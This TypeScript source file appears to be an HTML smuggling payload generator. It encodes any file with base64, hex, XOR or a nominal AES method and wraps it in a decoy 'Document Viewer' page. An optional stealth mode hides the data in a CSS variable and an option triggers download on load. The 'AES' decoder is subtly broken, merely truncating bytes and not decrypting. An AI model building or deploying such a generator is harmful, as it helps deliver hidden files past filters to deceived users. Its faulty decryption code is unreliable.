import { FileData, Config } from "@/pages/home";
import { 
  xorEncode, 
  xorDecode, 
  aesEncode, 
  aesDecode, 
  base64Encode, 
  base64Decode, 
  hexEncode, 
  hexDecode, 
  generateRandomKey 
} from "./encoders";

export async function generatePayload(fileData: FileData, config: Config): Promise<string> {
  const { file, content } = fileData;
  const key = config.encryptionKey || generateRandomKey();
  
  let encodedData: string;
  let decoderFunction: string;
  
  // Encode the file based on selected method
  switch (config.method) {
    case 'css':
      encodedData = base64Encode(content);
      decoderFunction = generateCSSDecoder();
      break;
      
    case 'xor':
      encodedData = xorEncode(content, key);
      decoderFunction = generateXORDecoder(key);
      break;
      
    case 'aes':
      encodedData = await aesEncode(content, key);
      decoderFunction = generateAESDecoder(key);
      break;
      
    case 'base64':
      encodedData = base64Encode(content);
      decoderFunction = generateBase64Decoder();
      break;
      
    case 'hex':
      encodedData = hexEncode(content);
      decoderFunction = generateHexDecoder();
      break;
      
    default:
      throw new Error('Unknown encoding method');
  }
  
  // Generate the HTML payload
  const html = generateHTMLTemplate({
    encodedData,
    decoderFunction,
    fileName: file.name,
    mimeType: file.type || 'application/octet-stream',
    autoDownload: config.autoDownload,
    stealthMode: config.stealthMode,
    method: config.method
  });
  
  return html;
}

interface TemplateParams {
  encodedData: string;
  decoderFunction: string;
  fileName: string;
  mimeType: string;
  autoDownload: boolean;
  stealthMode: boolean;
  method: string;
}

function generateHTMLTemplate(params: TemplateParams): string {
  const { encodedData, decoderFunction, fileName, mimeType, autoDownload, stealthMode, method } = params;
  
  const cssPayload = stealthMode ? `
    <style>
      :root {
        --payload-data: '${encodedData}';
        --payload-name: '${fileName}';
        --payload-type: '${mimeType}';
      }
      body { margin: 0; padding: 20px; font-family: Arial, sans-serif; }
      .container { max-width: 600px; margin: 0 auto; text-align: center; }
      .loading { margin: 20px 0; }
    </style>` : `
    <style>
      body { margin: 0; padding: 20px; font-family: Arial, sans-serif; }
      .container { max-width: 600px; margin: 0 auto; text-align: center; }
      .loading { margin: 20px 0; }
    </style>`;

  const payloadStorage = stealthMode 
    ? "const payloadData = getComputedStyle(document.documentElement).getPropertyValue('--payload-data').trim().slice(1, -1);"
    : `const payloadData = '${encodedData}';`;

  return `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document Viewer</title>
    ${cssPayload}
</head>
<body>
    <div class="container">
        <h2>Loading Document...</h2>
        <div class="loading">
            <p>Please wait while the document is being prepared.</p>
        </div>
    </div>

    <script>
        // Payload extraction and download
        (function() {
            try {
                ${payloadStorage}
                
                if (!payloadData) {
                    throw new Error('No payload data found');
                }

                ${decoderFunction}

                const decodedData = decodePayload(payloadData);
                const blob = new Blob([decodedData], { type: '${mimeType}' });
                const url = URL.createObjectURL(blob);
                
                ${autoDownload ? `
                // Auto-download
                const a = document.createElement('a');
                a.href = url;
                a.download = '${fileName}';
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
                
                document.querySelector('.container').innerHTML = '<h2>Download Started</h2><p>Your file should begin downloading automatically.</p>';
                ` : `
                // Manual download
                const a = document.createElement('a');
                a.href = url;
                a.download = '${fileName}';
                a.textContent = 'Click to Download ${fileName}';
                a.style.cssText = 'display: inline-block; padding: 10px 20px; background: #007bff; color: white; text-decoration: none; border-radius: 5px; margin: 20px 0;';
                
                document.querySelector('.container').innerHTML = '<h2>Document Ready</h2>';
                document.querySelector('.container').appendChild(a);
                `}
                
                // Cleanup URL after a delay
                setTimeout(() => URL.revokeObjectURL(url), 10000);
                
            } catch (error) {
                console.error('Payload extraction failed:', error);
                document.querySelector('.container').innerHTML = '<h2>Error</h2><p>Failed to load document.</p>';
            }
        })();
    </script>
</body>
</html>`;
}

function generateCSSDecoder(): string {
  return `
    function decodePayload(data) {
      const decoded = atob(data);
      const bytes = new Uint8Array(decoded.length);
      for (let i = 0; i < decoded.length; i++) {
        bytes[i] = decoded.charCodeAt(i);
      }
      return bytes;
    }
  `;
}

function generateXORDecoder(key: string): string {
  return `
    function decodePayload(data) {
      const key = '${key}';
      const decoded = atob(data);
      const bytes = new Uint8Array(decoded.length);
      for (let i = 0; i < decoded.length; i++) {
        bytes[i] = decoded.charCodeAt(i);
      }
      
      const keyBytes = new TextEncoder().encode(key);
      const result = new Uint8Array(bytes.length);
      
      for (let i = 0; i < bytes.length; i++) {
        result[i] = bytes[i] ^ keyBytes[i % keyBytes.length];
      }
      
      return result;
    }
  `;
}

function generateAESDecoder(key: string): string {
  return `
    function decodePayload(data) {
      // Simplified AES decoder for demo
      const key = '${key}';
      const decoded = atob(data);
      const bytes = new Uint8Array(decoded.length);
      for (let i = 0; i < decoded.length; i++) {
        bytes[i] = decoded.charCodeAt(i);
      }
      
      const keyData = new TextEncoder().encode(key.padEnd(32, '0').slice(0, 32));
      const originalLength = bytes.length - keyData.length;
      const result = new Uint8Array(originalLength);
      result.set(bytes.slice(0, originalLength));
      
      return result;
    }
  `;
}

function generateBase64Decoder(): string {
  return `
    function decodePayload(data) {
      const decoded = atob(data);
      const bytes = new Uint8Array(decoded.length);
      for (let i = 0; i < decoded.length; i++) {
        bytes[i] = decoded.charCodeAt(i);
      }
      return bytes;
    }
  `;
}

function generateHexDecoder(): string {
  return `
    function decodePayload(hexData) {
      const bytes = new Uint8Array(hexData.length / 2);
      for (let i = 0; i < hexData.length; i += 2) {
        bytes[i / 2] = parseInt(hexData.substr(i, 2), 16);
      }
      return bytes;
    }
  `;
}
